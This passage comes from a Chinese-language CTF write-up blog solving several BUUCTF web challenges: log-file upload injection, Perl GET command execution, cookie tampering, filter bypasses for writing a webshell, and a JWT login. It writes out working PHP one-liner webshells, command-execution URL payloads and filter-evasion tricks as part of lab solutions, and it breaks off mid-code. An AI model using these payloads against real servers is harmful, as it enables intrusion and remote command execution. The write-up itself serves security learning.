class="comment">#get_table_name()</span></span><br><span class="line"><span class="comment">#get_column_name()</span></span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure>



<p>使用上边爆出来的密码成功登录,来到一个文件上传页面</p>
<p><img src="/../images/buuctf-web3/image-20221027203616583.png" alt="image-20221027203616583"></p>
<p>无法上传php文件,这里成功上传了一个文件头写了<code>GIF89a</code>的<code>phtml</code>文件, 返回:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I logged the file name you uploaded to logs/upload.3673c55acd1587aea22bccc61ea61970.log.php. LOL&lt;script&gt;setTimeout(&#x27;location.href=&quot;user.php&quot;&#x27;,3000);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这里虽然不知道刚刚的文件上传到哪里了, 但是这里显示把上传文件的文件名写入了一个php文件里,那我们可以把文件名改为一句话木马的形式,来利用它写入的那个日志文件</p>
<p>这里直接把文件名改为常规的一句话木马会失败:</p>
<img src="../images/buuctf-web3/image-20221027204314677.png" alt="image-20221027204314677" style="zoom:67%;" />



<p><strong>使用php短标签成功上传</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<img src="../images/buuctf-web3/image-20221027204419575.png" alt="image-20221027204419575" style="zoom:67%;" />



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I logged the file name you uploaded to logs/upload.3673c55acd1587aea22bccc61ea61970.log.php. LOL</span><br></pre></td></tr></table></figure>

<p>蚁剑连接该文件后成功找到flag</p>
<br>

<hr>
<br>

<h1 id="perlGET命令执行-SSRFme"><a href="#perlGET命令执行-SSRFme" class="headerlink" title="[perlGET命令执行]SSRFme"></a>[perlGET命令执行]SSRFme</h1><p>开局给源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10.244</span>.<span class="number">80.206</span> </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$http_x_headers</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$http_x_headers</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]); <span class="comment">//filename传入一个文件的完整路径</span></span><br><span class="line"><span class="comment">// pathinfo的返回值中, $info[&quot;dirname&quot;]为上级目录,$info[&quot;basename&quot;]为文件名</span></span><br><span class="line">    <span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>]));</span><br><span class="line"><span class="comment">//basename($info[&quot;dirname&quot;])返回上一级目录的名称 如果$_GET[&quot;filename&quot;]为 /var/www/html/index,php,则这里为html</span></span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>); <span class="comment">//将data写入$_GET[&quot;filename&quot;]指定的文件中</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>这里可以先根据给出的IP和’orange’一起计算md5,得到<code>$sandbox</code>的路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5(orange10.244.80.206) = 2eeed2f9aeae6311b507ada8fb98809e</span><br><span class="line">sandbox/2eeed2f9aeae6311b507ada8fb98809e</span><br></pre></td></tr></table></figure>



<p><strong>这里的考点是<code>perl</code>的<code>GET</code>命令的命令执行漏洞, <code>GET</code>底层调用了<code>open</code>,而<code>open</code>支持<code>file协议</code>,可以通过<code>file</code>协议来执行命令,(尾部需要有管道符)但前提是同目录下要存在一个和要执行的命令同名的文件. 例如:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  test GET &#x27;file:id|&#x27;</span><br><span class="line">➜  test touch &#x27;id|&#x27;</span><br><span class="line">➜  test GET &#x27;file:id|&#x27;</span><br><span class="line">uid=1000(moxiaoxi) gid=1000(moxiaoxi) groups=1000(moxiaoxi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</span><br><span class="line">这里在目录下创建了一个名为&quot;id|&quot;的文件之后, 使用GET &#x27;file:id|&#x27;就能够成功地执行命令了</span><br></pre></td></tr></table></figure>

<p><code>perl</code>的<code>GET</code>还能够直接读取目录, 这里不通过底层<code>open</code>调用<code>file</code>协议,所以对于同目录下有无同名文件没有要求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /  读取根目录</span><br></pre></td></tr></table></figure>

<p>所以回到这道题, 有两种方式读取根目录下的内容,第一种是通过<code>file</code>来执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=file:ls /|&amp;filename=ls /|</span><br><span class="line">这里需要执行两次,第一次创建文件,第二次执行命令后将结果写入创建的文件</span><br></pre></td></tr></table></figure>

<p>或者直接读取:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/&amp;filename=aaa</span><br></pre></td></tr></table></figure>

<img src="../images/buuctf-web3/image-20221027221017805.png" alt="image-20221027221017805" style="zoom:67%;" />

<p>这里看到一个readflag文件,应该是要通过它来读取flag</p>
<p>这里不能直接使用 <code>/readflag</code>来执行,因为无法创建开头为<code>/</code>的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</span><br><span class="line">访问:http://8b9d61b0-e82c-4d7a-a8dc-87f936afe346.node4.buuoj.cn:81/sandbox/2eeed2f9aeae6311b507ada8fb98809e/bash%20-c%20/readflag%7C</span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure>

<p><img src="/../images/buuctf-web3/image-20221027221831388.png" alt="image-20221027221831388"></p>
<br>

<hr>
<br>



<h1 id="cookie-Cookie-Store"><a href="#cookie-Cookie-Store" class="headerlink" title="[cookie]Cookie Store"></a>[cookie]Cookie Store</h1><p>开始有50刀,买不起flag</p>
<img src="../images/buuctf-web3/image-20221028090015932.png" alt="image-20221028090015932" style="zoom:67%;" />

<p>买一点别的,抓包发现cookie中有个session的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session=eyJtb25leSI6IDEyMCwgImhpc3RvcnkiOiBbIll1bW15IHBlcHBhcmtha2EiXX0=</span><br><span class="line">base64解码:</span><br><span class="line">&#123;&quot;money&quot;: 40, &quot;history&quot;: [&quot;Yummy pepparkaka&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p>这里记录了本次购买前有多少钱,以及已买到的商品</p>
<p>直接把这里的money改为大于100,然后编码回去放进<code>cookie</code>里发送</p>
<p>成功返回了flag</p>
<img src="../images/buuctf-web3/image-20221028090231443.png" alt="image-20221028090231443" style="zoom:67%;" />



<br>

<hr>
<br>



<h1 id="绕过滤写一句话木马-write-shell"><a href="#绕过滤写一句话木马-write-shell" class="headerlink" title="[绕过滤写一句话木马]write_shell"></a>[绕过滤写一句话木马]write_shell</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>); <span class="comment">//如果传入的是数组,则将每个键的值都单独进行检测,然后赋给键</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="comment">//目录设定为: sandbox/远程ip的md5</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="comment">//向index.php中写入数据</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先传一下<code>action=pwd</code>,返回路径:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sandbox/c47b21fcf8f0bc8b3920541abd8024fd/</span><br></pre></td></tr></table></figure>

<p>这里输入的<code>data</code>参数的值会被写入<code>sandbox/c47b21fcf8f0bc8b3920541abd8024fd/index.php</code>中,那么这里的思路就是写一句话木马进去,但是需要绕过<code>check</code>函数的过滤</p>
<p>这里使用短标签和字符串拼接来绕过对<code>php</code>标签和函数名的过滤:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=upload&amp;data=&lt;?=(p.hpinfo)()?&gt;</span><br></pre></td></tr></table></figure>

<p>访问<code>sandbox/c47b21fcf8f0bc8b3920541abd8024fd/index.php</code>,能够成功执行<code>phpinfo()</code></p>
<p>那么接下来也不用<code>eval</code>了,直接<code>system</code>执行系统命令: 这里空格被过滤了,使用<code>tab(%09)</code>来代替</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?=(system)(&quot;ls%09/&quot;)?&gt;</span><br><span class="line">访问sandbox/c47b21fcf8f0bc8b3920541abd8024fd/index.php:</span><br><span class="line"></span><br><span class="line">bin boot dev etc flllllll1112222222lag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var var</span><br></pre></td></tr></table></figure>

<p>读取flag:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?=(system)(&quot;cat%09/flllllll1112222222lag&quot;)?&gt;</span><br></pre></td></tr></table></figure>

<br>

<hr>
<br>

<h1 id="套娃-Welcome-to-Earth"><a href="#套娃-Welcome-to-Earth" class="headerlink" title="[套娃]Welcome to Earth"></a>[套娃]Welcome to Earth</h1><p>直接一路抓包在源码里找到下一关的路径就行</p>
<p>有一些在f12抓到的js包里</p>
<p><img src="/../images/buuctf-web3/image-20221028094031075.png" alt="image-20221028094031075"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check_door</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> all_radio = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;door_form&quot;</span>).<span class="property">elements</span>;</span><br><span class="line">  <span class="keyword">var</span> guess = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; all_radio.<span class="property">length</span>; i++)</span><br><span class="line">    <span class="keyword">if</span> (all_radio[i].<span class="property">checked</span>) guess = all_radio[i].<span class="property">value</span>;</span><br><span class="line"></span><br><span class="line">  rand = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">360</span>);</span><br><span class="line">  <span class="keyword">if</span> (rand == guess) <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;/open/&quot;</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;/die/&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里直接找到了下一个目录:<code>open</code></p>
<p>同样的方法,下一个:<code>fight</code></p>
<p><img src="/../images/buuctf-web3/image-20221028094301555.png" alt="image-20221028094301555"></p>
<p><code>fight</code>中,同样找到响应中的<code>js</code>代码:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run to scramble original flag</span></span><br><span class="line"><span class="comment">//console.log(scramble(flag, action));</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">scramble</span>(<span class="params">flag, key</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; key.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = key.<span class="title function_">charCodeAt</span>(i) % flag.<span class="property">length</span>; <span class="comment">//charCodeAt返回字符串key中第i个位置的ascii码, 这里然后对flag的长度取余</span></span><br><span class="line">    <span class="keyword">let</span> temp = flag[i];</span><br><span class="line">    flag[i] = flag[n];</span><br><span class="line">    flag[n] = temp; <span class="comment">//交换flag[i]和flag[n]的位置</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check_action</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> action = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;action&quot;</span>).<span class="property">value</span>;</span><br><span class="line">  <span class="keyword">var</span> flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> unscramble function</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里<code>scramble</code>将原flag打乱为了:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;];</span><br><span class="line">那里肯定是:</span><br><span class="line">pctf&#123;hey........ck!&#125;</span><br><span class="line">pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</span><br></pre></td></tr></table></figure>

<p>这里大佬写了个脚本直接遍历:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">scramble = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>]</span><br><span class="line">maybe = itertools.permutations(scramble) <span class="comment"># 返回一个迭代器,其中的每一个元素都是列表(和上面不同的排列顺序)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> maybe:</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    <span class="keyword">if</span> flag.startswith(<span class="string">&#x27;pctf&#123;hey_boys&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&#x27;ck!&#125;&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">输出:</span><br><span class="line">pctf&#123;hey_boys_imaaaa_baaaaaack!&#125;</span><br><span class="line">pctf&#123;hey_boys_imaaaaaaaa_baack!&#125;</span><br><span class="line">pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</span><br><span class="line">pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</span><br><span class="line">pctf&#123;hey_boys_imaaaaaaaa_baack!&#125;</span><br><span class="line">pctf&#123;hey_boys_imaaaa_baaaaaack!&#125;</span><br></pre></td></tr></table></figure>

<p>找个那个最通顺的就是flag了</p>
<br>

<hr>
<br>

<h1 id="koa-JWT-EasyLogin"><a href="#koa-JWT-EasyLogin" class="headerlink" title="[koa,JWT]EasyLogin"></a>[koa,JWT]EasyLogin</h1><p>注册会返回一个<code>token</code>值</p>
<p><img src="/../images/buuctf-web3/image-20221028102210022.png" alt="image-20221028102210022"></p>
<p>然后登录时会将这个值作为<code>authorization</code>的值:</p>
<p><img src="/../images/buuctf-web3/image-20221028102247082.png" alt="image-20221028102247082"></p>
<p>响应包里的<code>sess;aok</code>解码为: 好像没什么用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6ImFhYSIsIl9leHBpcmUiOjE2NjcwMTAxNTEwNjcsIl9tYXhBZ2UiOjg2NDAwMDAwfQ==</span><br><span class="line">6LLpE8nZKrV_5lVZjcPLng1VDus</span><br><span class="line">&#123;&quot;username&quot;:&quot;aaa&quot;,&quot;_expire&quot;:1667010151067,&quot;_maxAge&quot;:86400000&#125;</span><br></pre></td></tr></table></figure>

<p>登陆后,这里随便提交一个值然后点击<code>get flag</code>会返回<code>permission denided</code></p>
<p><img src="/../images/buuctf-web3/image-20221028102544698.png" alt="image-20221028102544698"></p>
<p>另外注意到登陆时提交的<code>authorization</code>值被两个点分成了三部分,格式有点像<code>JWT</code>,拿到网站上解密一下:</p>
<img src="../images/buuctf-web3/image-20221028144144203.png" alt="image-20221028144144203" style="zoom:67%;" />







<p>这里源码里能找到<code>app.js</code>:</p>
<p><img src="/../images/buuctf-web3/image-20221028103221300.png" alt="image-20221028103221300"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  或许该用 koa-static 来处理静态文件</span></span><br><span class="line"><span class="comment"> *  路径该怎么配置？不管了先填个根目录XD</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">login</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">    <span class="keyword">const</span> token = sessionStorage.<span class="title function_">getItem</span>(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">    $.<span class="title function_">post</span>(<span class="string">&quot;/api/login&quot;</span>, &#123;username, password, <span class="attr">authorization</span>:token&#125;)</span><br><span class="line">        .<span class="title function_">done</span>(<span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;status&#125; = data;</span><br><span class="line">            <span class="keyword">if</span>(status) &#123;</span><br><span class="line">                <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&quot;/home&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">fail</span>(<span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(xhr.<span class="property">responseJSON</span>.<span class="property">message</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">register</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">    $.<span class="title function_">post</span>(<span class="string">&quot;/api/register&quot;</span>, &#123;username, password&#125;)</span><br><span class="line">        .<span class="title function_">done</span>(<span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; token &#125; = data;</span><br><span class="line">            sessionStorage.<span class="title function_">setItem</span>(<span class="string">&#x27;token&#x27;</span>, token);</span><br><span class="line">            <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&quot;/login&quot;</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">fail</span>(<span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(xhr.<span class="property">responseJSON</span>.<span class="property">message</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">logout</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $.<span class="title function_">get</span>(<span class="string">&#x27;/api/logout&#x27;</span>).<span class="title function_">done</span>(<span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;status&#125; = data;</span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="property">location</span> = <span 